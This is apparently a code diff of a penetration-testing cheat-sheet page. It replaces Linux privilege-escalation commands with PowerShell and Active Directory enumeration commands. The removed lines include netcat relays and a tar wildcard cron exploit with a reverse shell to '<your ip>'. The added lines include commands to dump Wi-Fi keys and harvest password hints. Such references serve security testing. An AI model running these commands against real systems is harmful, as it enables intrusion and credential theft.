@@ -1,262 +1,213 @@
-import React from 'react';
-import { Typography, Divider } from 'antd';
-import QueueAnim from 'rc-queue-anim';
-const { Title, Paragraph } = Typography;
+import React from "react";
+import { Typography, Divider } from "antd";
+import QueueAnim from "rc-queue-anim";
+const { Title, Paragraph, Text } = Typography;
 
 export default (props) => {
-	const Suid = [
-		{ title: 'find / -user root -perm /4000 2>/dev/null' },
-		{ title: 'find / -perm -u=s -type f 2>/dev/null' },
-		{ title: "find / -type f -name '*.txt' 2>/dev/null" },
-		{ title: 'find / -user root -perm -4000 -exec ls -ldb {}; > /tmp/suid' }
-	];
-	const VersionSystem = [
-		{ title: 'cat /etc/issue' },
-		{ title: 'cat /etc/*-release' },
-		{ title: 'cat /etc/lsb-release' },
-		{ title: 'cat /etc/redhat-release' }
-	];
-	const KernelVersion = [
-		{ title: 'cat /proc/version' },
-		{ title: 'uname -a' },
-		{ title: 'uname -mrs' },
-		{ title: 'rpm -q kernel' },
-		{ title: 'dmesg | grep Linux' },
-		{ title: 'ls /boot | grep vmlinuz' }
-	];
-	const EnvironmentVariables = [
-		{ title: 'cat /etc/profile' },
-		{ title: 'cat /etc/bashrc' },
-		{ title: 'cat ~/.bash_profile' },
-		{ title: 'cat ~/.bashrc' },
-		{ title: 'cat ~/.bash_logout' },
-		{ title: 'env' },
-		{ title: 'set' }
-	];
-	const ServiceSettings = [
-		{ title: 'cat /etc/syslog.conf' },
-		{ title: 'cat /etc/chttp.conf' },
-		{ title: 'cat /etc/lighttpd.conf' },
-		{ title: 'cat /etc/cups/cupsd.conf' },
-		{ title: 'cat /etc/inetd.conf' },
-		{ title: 'cat /etc/apache2/apache2.conf' },
-		{ title: 'cat /etc/my.conf' },
-		{ title: 'cat /etc/httpd/conf/httpd.conf' },
-		{ title: 'cat /opt/lampp/etc/httpd.conf' },
-		{ title: 'ls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/' }
-	];
-	const CronJobs = [
-		{ title: 'crontab -l' },
-		{ title: 'ls -alh /var/spool/cron' },
-		{ title: 'ls -al /etc/ | grep cron' },
-		{ title: 'ls -al /etc/cron*' },
-		{ title: 'cat /etc/cron*' },
-		{ title: 'cat /etc/at.allow' },
-		{ title: 'cat /etc/at.deny' },
-		{ title: 'cat /etc/cron.allow' },
-		{ title: 'cat /etc/cron.deny' },
-		{ title: 'cat /etc/crontab' },
-		{ title: 'cat /etc/anacrontab' },
-		{ title: 'cat /var/spool/cron/crontabs/root' }
-	];
-	const UsersHost = [
-		{ title: 'lsof -i' },
-		{ title: 'lsof -i :80' },
-		{ title: 'grep 80 /etc/services' },
-		{ title: 'netstat -antup' },
-		{ title: 'netstat -antpx' },
-		{ title: 'netstat -tulpn' },
-		{ title: 'chkconfig --list' },
-		{ title: 'chkconfig --list | grep 3:on' },
-		{ title: 'last' }
-	];
-	const PortForwarding = [
-		{
-			title: '# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]'
-		},
-		{ title: 'FPipe.exe -l 80 -r 80 -s 80 192.168.1.7' },
-		{
-			title: '# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]'
-		},
-		{ title: 'ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Port' },
-		{ title: 'ssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port' },
-		{
-			title: '# mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe'
-		},
-		{
-			title: 'mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe # Port Relay'
-		},
-		{
-			title:
-				'mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe # Proxy (Port 80 to 8080)'
-		},
-		{ title: 'backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc' },
-		{
-			title: 'localhost 80 | tee -a outflow & 1>backpipe # Proxy monitor (Port 80 to 8080)'
-		}
-	];
-	const wildcardPrivesc = [
-		{
-			title: ` echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
-        1234 >/tmp/f" > shell.sh`
-		},
-		{
-			title: `touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"`
-		},
-		{
-			title: ` touch "/var/www/html/--checkpoint=1"`
-		}
-	];
-	return (
-		<QueueAnim delay={300} duration={1500}>
-			<Title variant='Title level={3}' style={{ fontWeight: 'bold', margin: 15 }}>
-				Useful Powershell commands for your Penetration Testing
-			</Title>
-			<Paragraph style={{ margin: 15 }}>List of useful commands on Powershell</Paragraph>
-			<Divider dashed />
-			<div
-				key='a'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>SUID Commands</Title>
-				{Suid.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-			<Divider dashed />
-			<div
-				key='b'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>What version of the system ?</Title>
-				{VersionSystem.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-			<Divider dashed />
-			<div
-				key='c'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>What is its kernel version ?</Title>
-				{KernelVersion.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-			<div
-				key='d'
-				style={{
-					padding: 15
-				}}
-			>
-				<Divider dashed />
-				<Title level={3}>What is the environment variables ?</Title>
-				{EnvironmentVariables.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-			<Divider dashed />
-			<div
-				key='e'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>Service settings, there is any wrong allocation?</Title>
-				{ServiceSettings.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-			<Divider dashed />
-			<div
-				key='f'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>Is there any cron jobs ?</Title>
-				{CronJobs.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-			<Divider dashed />
-			<div
-				key='g'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>Other users host communication with the system ?</Title>
-				{UsersHost.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-			<Divider dashed />
-			<div
-				key='h'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>How to port forwarding ?</Title>
-				{PortForwarding.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-			<Divider dashed />
-			<div
-				key='h'
-				style={{
-					padding: 15
-				}}
-			>
-				<Title level={3}>TAR wildcard cronjob privilege escalation </Title>
-				{wildcardPrivesc.map((k, i) => {
-					return (
-						<Paragraph key={i} copyable ellipsis={true}>
-							{k.title}
-						</Paragraph>
-					);
-				})}
-			</div>
-		</QueueAnim>
-	);
+  const local_sys_enum = [
+    { title: "systeminfo" },
+    { title: "Get-WmiObject Win32_ComputerSystem" },
+    { title: 'echo "$env:COMPUTERNAME.$env:USERDNSDOMAIN"' },
+  ];
+  const lastpatchlist = 'Get-Hotfix -description "Security update"';
+  const envVar = "Get-ChildItem Env: | ft Key,Value";
+  const wlan_creddump = [
+    { title: "netsh wlan show profiles" },
+    { title: 'netsh wlan show profile name="NETWORK" key=clear' },
+  ];
+
+  // domain enum
+  const domain_name = `Get-NetDomain`;
+  const forest_domain_list = `Get-NetForestDomain`;
+  const domain_SID = `Get-DomainSID `;
+  const domain_Policy = `Get-DomainPolicy`;
+  const domain_OUs = `Get-NetOU`;
+  const domain_trust = `Get-NetDomainTrust`;
+  // gpo
+  const gpo_enum = `Get-NetGPO -ComputerName computername.domain.com`;
+  // passwd enum
+  const passwd_lastset = `Get-UserProperty –Properties pwdlastset`;
+  const user_desc_harvest = `Find-UserField -SearchField Description –SearchTerm “pass”`;
+
+  //computers domain
+  const domain_computers = `Get-NetComputer`;
+  const domain_pingable_computers = `Get-NetComputer -Ping`;
+  const domain_win7U_computers = `Get-NetComputer –OperatingSystem "Windows 7 Ultimate"`;
+
+  //domain admins
+  const domain_admin_members = `Get-NetGroupMember -GroupName "Domain Admins"`;
+  const domain_admins_groups = `Get-NetGroup *admin*`;
+  const local_admins = `Get-NetLocalGroup –ComputerName PCNAME-001`;
+  const user_group_membership = `Get-NetGroup –UserName "username"`;
+
+  //acl
+  const ACL_user_enum = `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`;
+  const ACL_gpoedit_rights = `Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`;
+  const ACL_passwd_edit_rights = `Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"`;
+
+  return (
+    <QueueAnim delay={300} duration={1500}>
+      <Title
+        variant="Title level={3}"
+        style={{ fontWeight: "bold", margin: 15 }}
+      >
+        Powershell handy commands
+      </Title>
+      <Paragraph style={{ margin: 15 }}>
+        List of useful Powershell commands
+      </Paragraph>
+      <Divider dashed />
+      <div
+        key="a"
+        style={{
+          padding: 15,
+        }}
+      >
+        <Title level={3}>System enumeration</Title>
+        {local_sys_enum.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable ellipsis={true}>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+        <Text strong># list Security patches</Text>
+        <Paragraph copyable ellipsis={true}>
+          {lastpatchlist}
+        </Paragraph>
+        <Text strong># Environment Variables</Text>
+        <Paragraph copyable ellipsis={true}>
+          {envVar}
+        </Paragraph>
+        <Title level={4}>WLAN enumeration</Title>
+        {wlan_creddump.map((k, i) => {
+          return (
+            <Paragraph key={i} copyable ellipsis={true}>
+              {k.title}
+            </Paragraph>
+          );
+        })}
+      </div>
+
+      <Divider dashed />
+      <div
+        key="b"
+        style={{
+          padding: 15,
+        }}
+      >
+        <Title level={2}>Active Directory enumeration</Title>
+
+        <Title level={4}> Domain enumeration</Title>
+
+        <Paragraph copyable ellipsis={true}>
+          {domain_name}
+        </Paragraph>
+
+        <Text strong># list Forest Domains </Text>
+        <Paragraph copyable ellipsis={true}>
+          {forest_domain_list}
+        </Paragraph>
+
+        <Text strong># Domain SID </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_SID}
+        </Paragraph>
+
+        <Text strong># Domain Policy </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_Policy}
+        </Paragraph>
+
+        <Text strong># Domain Organizational Units </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_OUs}
+        </Paragraph>
+
+        <Text strong># list trusted Domains</Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_trust}
+        </Paragraph>
+
+        <Divider dashed />
+
+        <Title level={4}> GPO enumeration</Title>
+
+        <Text strong># Gpo applied to the machine</Text>
+        <Paragraph copyable ellipsis={true}>
+          {gpo_enum}
+        </Paragraph>
+
+        <Divider dashed />
+
+        <Title level={4}> Password enumeration</Title>
+
+        <Text strong># Last Password Set date</Text>
+        <Paragraph copyable ellipsis={true}>
+          {passwd_lastset}
+        </Paragraph>
+        <Text strong># Description of User object </Text>
+        <Paragraph copyable ellipsis={true}>
+          {user_desc_harvest}
+        </Paragraph>
+        <Divider dashed />
+
+        <Title level={4}> Computer enumeration</Title>
+
+        <Text strong># list Computers of the Domain</Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_computers}
+        </Paragraph>
+        <Text strong># list Pingable Hosts </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_pingable_computers}
+        </Paragraph>
+        <Text strong># list Windows 7 Ultimate Computers </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_win7U_computers}
+        </Paragraph>
+
+        <Divider dashed />
+
+        <Title level={4}> Admin groups and account enumeration</Title>
+
+        <Text strong># list Domain Admin members</Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_admin_members}
+        </Paragraph>
+        <Text strong># list Admin Groups </Text>
+        <Paragraph copyable ellipsis={true}>
+          {domain_admins_groups}
+        </Paragraph>
+        <Text strong># list Local Admins [need Administrative rights] </Text>
+        <Paragraph copyable ellipsis={true}>
+          {local_admins}
+        </Paragraph>
+
+        <Text strong># get groups of user [need Administrative rights] </Text>
+        <Paragraph copyable ellipsis={true}>
+          {user_group_membership}
+        </Paragraph>
+
+        <Divider dashed />
+
+        <Title level={4}> ACL enumeration</Title>
+
+        <Text strong># user ACL </Text>
+        <Paragraph copyable ellipsis={true}>
+          {ACL_user_enum}
+        </Paragraph>
+
+        <Text strong># GPO modifications rights</Text>
+        <Paragraph copyable ellipsis={true}>
+          {ACL_gpoedit_rights}
+        </Paragraph>
+
+        <Text strong># Password reset rights</Text>
+        <Paragraph copyable ellipsis={true}>
+          {ACL_passwd_edit_rights}
+        </Paragraph>
+      </div>
+    </QueueAnim>
+  );
 };
